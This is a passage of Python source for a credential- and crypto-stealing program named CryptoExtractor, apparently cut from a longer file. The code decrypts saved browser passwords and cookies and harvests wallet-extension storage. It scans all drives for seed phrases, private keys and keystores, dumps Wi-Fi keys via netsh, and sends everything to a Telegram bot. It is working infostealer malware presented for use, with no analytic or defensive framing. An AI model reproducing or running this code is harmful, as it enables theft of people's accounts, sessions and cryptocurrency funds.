                            seeds = self.extract_seeds_from_json(entry, wallet_name)
                            all_seeds.extend(seeds)
                    except:
                        pass
                    continue
                
                # If it's a directory, walk through it or read as LevelDB
                # First try to read as LevelDB database
                try:
                    entries = self.read_leveldb(storage_path)
                    for entry in entries:
                        seeds = self.extract_seeds_from_json(entry, wallet_name)
                        all_seeds.extend(seeds)
                        
                        # Decrypt encrypted values
                        if isinstance(entry, dict):
                            for key, value in entry.items():
                                if isinstance(value, (str, bytes)):
                                    try:
                                        value_bytes = value.encode('latin-1') if isinstance(value, str) else value
                                        if isinstance(value, str) and (value.startswith('v10') or value.startswith('v11')):
                                            if chrome_key:
                                                decrypted = self.decrypt_value(value_bytes, chrome_key)
                                                if decrypted:
                                                    try:
                                                        decrypted_json = json.loads(decrypted)
                                                        seeds = self.extract_seeds_from_json(decrypted_json, wallet_name)
                                                        all_seeds.extend(seeds)
                                                    except:
                                                        # Check if decrypted text is a seed phrase
                                                        words = decrypted.split()
                                                        if 12 <= len(words) <= 24:
                                                            valid = sum(1 for w in words if w.lower() in BIP39_WORDLIST_SET)
                                                            if valid >= len(words) * 0.8:
                                                                all_seeds.append({
                                                                    "type": "seed_phrase",
                                                                    "source": f"{wallet_name}_extension_decrypted",
                                                                    "value": decrypted.strip(),
                                                                    "word_count": len(words)
                                                                })
                                    except: pass
                except:
                    # Fallback: walk through files
                    pass
                
                # Also walk through files as fallback
                for root, dirs, files in os.walk(storage_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                    
                    try:
                        # Read LevelDB files
                        if file.endswith('.ldb') or file.endswith('.log'):
                            # Try to read as LevelDB
                            entries = self.read_leveldb_file(file_path)
                            
                            for entry in entries:
                                # Extract seeds from JSON entries
                                seeds = self.extract_seeds_from_json(entry, wallet_name)
                                all_seeds.extend(seeds)
                                
                                # Also check for encrypted values
                                if isinstance(entry, dict):
                                    for key, value in entry.items():
                                        if isinstance(value, (str, bytes)):
                                            # Try to decrypt if it looks encrypted
                                            try:
                                                if isinstance(value, str) and (value.startswith('v10') or value.startswith('v11')):
                                                    # Chrome encrypted format
                                                    if chrome_key:
                                                        decrypted = self.decrypt_value(value.encode() if isinstance(value, str) else value, chrome_key)
                                                        if decrypted:
                                                            decrypted_json = json.loads(decrypted)
                                                            seeds = self.extract_seeds_from_json(decrypted_json, wallet_name)
                                                            all_seeds.extend(seeds)
                                            except:
                                                pass
                            
                            # Also try to decode as text for plaintext storage
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                text = content.decode('utf-8', errors='ignore')
                                
                                # Look for JSON in text
                                try:
                                    # Try to find JSON objects in the text
                                    import re
                                    json_matches = re.findall(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', text)
                                    for match in json_matches[:10]:  # Limit to first 10
                                        try:
                                            json_data = json.loads(match)
                                            seeds = self.extract_seeds_from_json(json_data, wallet_name)
                                            all_seeds.extend(seeds)
                                        except:
                                            pass
                                except:
                                    pass
                                
                                # Check for plaintext seed phrases
                                if any(kw in text.lower() for kw in ['seed', 'mnemonic', 'private', 'key', 'wallet', 'phrase', 'recovery']):
                                    all_wallets.append({
                                        "wallet": wallet_name,
                                        "browser": browser_name,
                                        "file": file_path,
                                        "data": text[:5000],
                                        "size": len(content)
                                    })
                        
                        # Also check JSON files
                        elif file.endswith('.json'):
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                try:
                                    json_data = json.load(f)
                                    seeds = self.extract_seeds_from_json(json_data, wallet_name)
                                    all_seeds.extend(seeds)
                                except:
                                    # Try as text
                                    f.seek(0)
                                    text = f.read()
                                    seeds = self.extract_seeds_from_json(text, wallet_name)
                                    all_seeds.extend(seeds)
                    except Exception as e:
                        self._log(f"Error reading {file_path}: {e}")
                        continue
        
        # Add extracted seeds to the data structure
        for seed in all_seeds:
            self.data["crypto"]["seeds"].append({
                "file": seed.get("source", "extension_vault"),
                "content": seed.get("value", ""),
                "type": seed.get("type", "seed_phrase"),
                "word_count": seed.get("word_count", 0)
            })
        
        return all_wallets
    
    def extract_browser_passwords(self, browser_path, browser_name):
        """Extract browser passwords"""
        passwords = []
        try:
            login_db = os.path.join(browser_path, 'Default', 'Login Data')
            local_state = os.path.join(browser_path, 'Local State')
            
            if not os.path.exists(login_db):
                return passwords
            
            key = self.get_chrome_key(local_state)
            temp_db = os.path.join(self.output_dir, f'{browser_name}_login.db')
            
            try:
                shutil.copy2(login_db, temp_db)
            except:
                return passwords
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, user, enc_pwd in cursor.fetchall():
                if enc_pwd:
                    pwd = self.decrypt_value(enc_pwd, key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            
            conn.close()
            try:
                os.remove(temp_db)
            except: pass
            
        except Exception as e:
            self._log(f"Error: {e}")
        
        return passwords
    
    def extract_browser_cookies(self, browser_path, browser_name):
        """Extract browser cookies"""
        cookies = []
        try:
            cookie_db = os.path.join(browser_path, 'Default', 'Cookies')
            local_state = os.path.join(browser_path, 'Local State')
            
            if not os.path.exists(cookie_db):
                return cookies
            
            key = self.get_chrome_key(local_state)
            temp_db = os.path.join(self.output_dir, f'{browser_name}_cookies.db')
            
            try:
                shutil.copy2(cookie_db, temp_db)
            except:
                return cookies
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 5000")
            
            for host, name, val, enc_val in cursor.fetchall():
                cookie_val = self.decrypt_value(enc_val, key) if enc_val else val
                if cookie_val:
                    cookies.append({"host": host, "name": name, "value": cookie_val})
            
            conn.close()
            try:
                os.remove(temp_db)
            except: pass
            
        except: pass
        
        return cookies
    
    def search_seed_phrases(self):
        """Comprehensive seed phrase search"""
        self._log("Searching for seed phrases...")
        seeds = []
        
        # Get all drives for FULL PC SCAN
        drives = []
        try:
            result = subprocess.run(['wmic', 'logicaldisk', 'get', 'name'], capture_output=True, text=True)
            drives = [line.strip() + '\\' for line in result.stdout.split('\n') if line.strip() and ':' in line]
        except:
            drives = ['C:\\']
        
        user_paths = [
            os.environ.get('APPDATA', ''),
            os.environ.get('LOCALAPPDATA', ''),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
        ]
        
        search_paths = drives + user_paths
        
        wallet_dirs = [
            'MetaMask', 'Trust Wallet', 'Exodus', 'Atomic Wallet', 'Electrum',
            'MyEtherWallet', 'Phantom', 'Solflare', 'Coinbase', 'Binance',
            'Ledger', 'Trezor', 'KeepKey', 'Jaxx', 'Jaxx Liberty',
        ]
        
        seed_patterns = ['seed', 'mnemonic', 'wallet', 'backup', 'recovery', 'private', 'key', 'phrase', 'keystore', 'passphrase']
        crypto_extensions = ['.txt', '.json', '.dat', '.key', '.wallet', '.keystore', '.db', '.sqlite', '.ldb']
        
        self.telegram.send_message("🔍 <b>Scanning entire PC for crypto data...</b>")
        
        for base_path in search_paths:
            if not os.path.exists(base_path):
                continue
            
            is_drive_root = len(base_path) == 3 and base_path.endswith(':\\')
            
            try:
                for root, dirs, files in os.walk(base_path):
                    if not is_drive_root:
                        dirs[:] = [d for d in dirs if d not in ['$Recycle.Bin', 'System Volume Information', 'Windows', 'Program Files', 'Program Files (x86)']]
                    
                    if is_drive_root:
                        depth = root[len(base_path):].count(os.sep) if base_path else 0
                        if depth > 3:
                            dirs[:] = []
                            continue
                    
                    for file in files:
                        file_lower = file.lower()
                        file_path = os.path.join(root, file)
                        
                        if any(p in file_lower for p in seed_patterns) or any(file.endswith(ext) for ext in crypto_extensions):
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(50000)
                                    words = content.split()
                                    
                                    if 12 <= len(words) <= 24:
                                        # Validate against BIP39 wordlist
                                        valid_words = sum(1 for w in words if w.lower() in BIP39_WORDLIST_SET)
                                        if valid_words >= len(words) * 0.8:  # 80% of words should be valid BIP39 words
                                            seeds.append({
                                                "file": file_path,
                                                "content": content[:5000],
                                                "word_count": len(words),
                                                "type": "seed_phrase"
                                            })
                                    
                                    elif len(content.strip()) == 64 or (content.strip().startswith('0x') and len(content.strip()) == 66):
                                        seeds.append({
                                            "file": file_path,
                                            "content": content.strip(),
                                            "type": "private_key"
                                        })
                                    
                                    elif content.strip().startswith('{') and ('crypto' in content.lower() or 'keystore' in content.lower()):
                                        try:
                                            json_data = json.loads(content)
                                            if 'crypto' in json_data or 'keystore' in json_data:
                                                seeds.append({
                                                    "file": file_path,
                                                    "content": content[:5000],
                                                    "type": "keystore"
                                                })
                                        except: pass
                            except: continue
            except: continue
        
        return seeds
    
    def extract_wifi_passwords(self):
        """Extract WiFi passwords"""
        wifi = []
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, encoding='utf-8', errors='ignore')
            profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') 
                       if 'Profile' in line and ':' in line]
            
            for prof in profiles:
                try:
                    res = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={prof}', 'key=clear'],
                                        capture_output=True, text=True, encoding='utf-8', errors='ignore')
                    for line in res.stdout.split('\n'):
                        if 'Key Content' in line and ':' in line:
                            pwd = line.split(':')[1].strip()
                            if pwd:
                                wifi.append({"ssid": prof, "password": pwd})
                            break
                except: continue
        except: pass
        
        return wifi
    
    def format_telegram_message(self):
        """Format data for Telegram with nice UI"""
        msg = "🔐 <b>CRYPTO DATA EXTRACTION REPORT</b>\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        # Crypto Wallets
        wallet_count = len(self.data['crypto']['wallets'])
        msg += f"💰 <b>CRYPTO WALLETS:</b> {wallet_count}\n"
        
        if wallet_count > 0:
            wallets_by_name = {}
            for wallet in self.data['crypto']['wallets']:
                name = wallet.get('wallet', 'unknown')
                if name not in wallets_by_name:
                    wallets_by_name[name] = []
                wallets_by_name[name].append(wallet)
            
            for name, wallets in wallets_by_name.items():
                msg += f"  • <b>{name.upper()}</b>: {len(wallets)} entries\n"
        
        msg += "\n"
        
        # Seed Phrases
        seed_count = len(self.data['crypto']['seeds'])
        msg += f"🌱 <b>SEED PHRASES:</b> {seed_count}\n"
        if seed_count > 0:
            for i, seed in enumerate(self.data['crypto']['seeds'][:5], 1):  # First 5
                seed_type = seed.get('type', 'unknown')
                content = seed.get('content', '')[:100]
                msg += f"  {i}. <code>{seed_type}</code>\n"
                msg += f"     {content}...\n"
            if seed_count > 5:
                msg += f"     ... and {seed_count - 5} more\n"
        
        msg += "\n"
        
        # Browser Passwords
        total_passwords = sum(len(b.get('passwords', [])) for b in self.data['browsers'].values())
        msg += f"🔑 <b>BROWSER PASSWORDS:</b> {total_passwords}\n"
        for browser, data in self.data['browsers'].items():
            pwd_count = len(data.get('passwords', []))
            if pwd_count > 0:
                msg += f"  • <b>{browser.upper()}</b>: {pwd_count} passwords\n"
        
        msg += "\n"
        
        # Cookies
        total_cookies = sum(len(b.get('cookies', [])) for b in self.data['browsers'].values())
        msg += f"🍪 <b>COOKIES:</b> {total_cookies}\n"
        
        msg += "\n"
        
        # WiFi
        wifi_count = len(self.data['system'].get('wifi', []))
        msg += f"📶 <b>WI-FI PASSWORDS:</b> {wifi_count}\n"
        
        msg += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"⏰ <i>Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>"
        
        return msg
    
    def send_to_telegram(self):
        """Send all data to Telegram"""
        try:
            # Send summary message
            summary = self.format_telegram_message()
            self.telegram.send_message(summary)
            time.sleep(1)
            
            # Send detailed crypto data
            if self.data['crypto']['wallets']:
                crypto_text = "💰 <b>DETAILED CRYPTO WALLET DATA</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for wallet in self.data['crypto']['wallets'][:10]:  # First 10
                    crypto_text += f"<b>{wallet.get('wallet', 'unknown').upper()}</b> ({wallet.get('browser', 'unknown')})\n"
                    crypto_text += f"<code>{wallet.get('data', '')[:500]}</code>\n\n"
                    if len(crypto_text) > 3500:  # Telegram limit
                        self.telegram.send_message(crypto_text)
                        crypto_text = ""
                        time.sleep(1)
                if crypto_text:
                    self.telegram.send_message(crypto_text)
                time.sleep(1)
            
            # Send seed phrases
            if self.data['crypto']['seeds']:
                seeds_text = "🌱 <b>SEED PHRASES & PRIVATE KEYS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for seed in self.data['crypto']['seeds']:
                    seeds_text += f"<b>Type:</b> {seed.get('type', 'unknown')}\n"
                    seeds_text += f"<b>File:</b> <code>{seed.get('file', '')}</code>\n"
                    seeds_text += f"<b>Content:</b>\n<code>{seed.get('content', '')[:1000]}</code>\n\n"
                    if len(seeds_text) > 3500:
                        self.telegram.send_message(seeds_text)
                        seeds_text = ""
                        time.sleep(1)
                if seeds_text:
                    self.telegram.send_message(seeds_text)
                time.sleep(1)
            
            # Send passwords (first 20)
            all_passwords = []
            for browser, data in self.data['browsers'].items():
                for pwd in data.get('passwords', [])[:20]:
                    all_passwords.append((browser, pwd))
            
            if all_passwords:
                pwd_text = "🔑 <b>BROWSER PASSWORDS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for browser, pwd in all_passwords:
                    pwd_text += f"<b>{browser.upper()}</b>\n"
                    pwd_text += f"URL: <code>{pwd['url']}</code>\n"
                    pwd_text += f"User: <code>{pwd['username']}</code>\n"
                    pwd_text += f"Pass: <code>{pwd['password']}</code>\n\n"
                    if len(pwd_text) > 3500:
                        self.telegram.send_message(pwd_text)
                        pwd_text = ""
                        time.sleep(1)
                if pwd_text:
                    self.telegram.send_message(pwd_text)
            
            # Send JSON file if small enough
            json_file = os.path.join(self.output_dir, f"data_{int(time.time())}.json")
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
            
            # Try to send file (if under 50MB)
            if os.path.getsize(json_file) < 50 * 1024 * 1024:
                self.telegram.send_document(json_file, "📄 Complete JSON Data")
            
        except Exception as e:
            self._log(f"Telegram error: {e}")
    
    def extract_all(self):
        """Extract everything and send to Telegram"""
        self._log("Starting extraction...")
        
        # Send start notification
        self.telegram.send_message("🚀 <b>Extraction Started</b>\n\nBeginning data extraction...")
        
        # Extract from all browsers
        browser_paths = self.get_browser_paths()
        
        for browser_name, browser_path in browser_paths.items():
            self._log(f"Processing {browser_name}")
            
            crypto_wallets = self.extract_all_crypto_extensions(browser_path, browser_name)
            self.data["crypto"]["wallets"].extend(crypto_wallets)
            
            self.data["browsers"][browser_name] = {
                "passwords": self.extract_browser_passwords(browser_path, browser_name),
                "cookies": self.extract_browser_cookies(browser_path, browser_name),
            }
        
        self.data["crypto"]["seeds"] = self.search_seed_phrases()
        self.data["system"]["wifi"] = self.extract_wifi_passwords()
        
        # Send to Telegram
        self.send_to_telegram()
        
        return self.data

if __name__ == "__main__":
    extractor = CryptoExtractor()
    extractor.extract_all()

